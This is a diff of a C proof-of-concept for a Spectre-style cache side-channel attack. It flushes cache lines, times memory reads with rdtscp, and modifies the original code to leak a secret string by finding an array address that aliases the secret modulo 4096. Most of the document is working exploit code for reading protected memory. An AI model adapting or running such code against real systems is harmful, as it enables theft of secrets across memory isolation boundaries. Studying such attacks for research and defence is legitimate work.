@@ -36,9 +36,10 @@ uint8_t array1[160] = {
 };
 uint8_t unused2[64];
 uint8_t array2[256 * 512];
-uint8_t bigArray[4096 * 512];
+uint8_t bigArray[4096];
 char * secret = "The password is rootkea";
 uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
+volatile uint8_t* addr;
 
 void victim_function() {
   
@@ -53,13 +54,12 @@ Analysis code
 #define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
 
 /* Report best guess in value[0] and runner-up in value[1] */
-void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
+void readMemoryByte(size_t malicious_x, uint8_t value[3], int score[3]) {
   static int results[256];
   int tries, i, j, k, mix_i, junk = 0;
   uint8_t data = 0;
   size_t training_x, x;
   register uint64_t time1, time2;
-  volatile uint8_t * addr;
   bigArray[4096] = 'h';
 
 
@@ -70,23 +70,20 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
     results[0] = 0;
     /* Flush big array[4096*(0..255)] from cache */
     for (i = 0; i < 4096; i++)
-      _mm_clflush( & bigArray[i * 512]); /* intrinsic for clflush instruction */
+      _mm_clflush( & bigArray[i]); /* intrinsic for clflush instruction */
+    
     /* Flush array2[4096*(0..255)] from cache */
     for (i = 0; i < 256; i++)
       _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
 
         
-    /* Call the victim! */
-    //victim_function(); //store in big[0]
-    
-    
     for (j = 29; j >= 0; j--) {
         for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
+        
 
-        /* Call the victim! */
-        addr = &bigArray[4096];
+        addr = &bigArray[malicious_x];
 
-        bigArray[0] = 'q';
+        secret[0] = 'q';
 
         data = *addr;
         //Now the data from bigArray[0] is supposed to temporarily be in (data) so we will access this point
@@ -105,8 +102,6 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
         time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
         if (time2 <= CACHE_HIT_THRESHOLD ) { //TODO: also check it is not the thing in 4096
             results[mix_i]++; /* cache hit - add +1 to score for this value */
-            //printf("got here with: %d after cycles:", mix_i);
-            //printf("%" PRId64 "\n", time2);
 
         }
     }
@@ -148,15 +143,30 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 }
 
 int main(int argc, const char * * argv) {
-  size_t malicious_x = (size_t)(secret - (char * ) array1); /* default for malicious_x */
+  size_t malicious_x = 1; /* default for malicious_x */
   int i, score[3], len = 23;
   uint8_t value[3];
   for (i = 0; i < sizeof(array2); i++)
     array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
+  for (i = 0; i < sizeof(bigArray); i++)
+      bigArray[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
 
+  uint32_t addressOfStartOfSecretModulo = (uint32_t)&secret[0] % 4096;
+
+  //Find the address that corresponds to secret[0] in terms of its modulu
+  for (i = 0; i < sizeof(bigArray); i++) {
+      addr = &bigArray[i];
+      printf("current is %d in iteration %d\n", (uint32_t)(addr) % 4096, i);
+      if ((uint32_t)(addr) % 4096 == addressOfStartOfSecretModulo) {
+          malicious_x = i; //This is the location that we need in bigArray
+          break;
+      }
+  }
+  bigArray[malicious_x] = 'A';
+     
   while (--len >= 0) {
     printf("iteration %d \n", len);
-    readMemoryByte(malicious_x++, value, score);
+    readMemoryByte(malicious_x, value, score);
 
     printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
     printf("0x%02X=%c score=%d ", value[0],
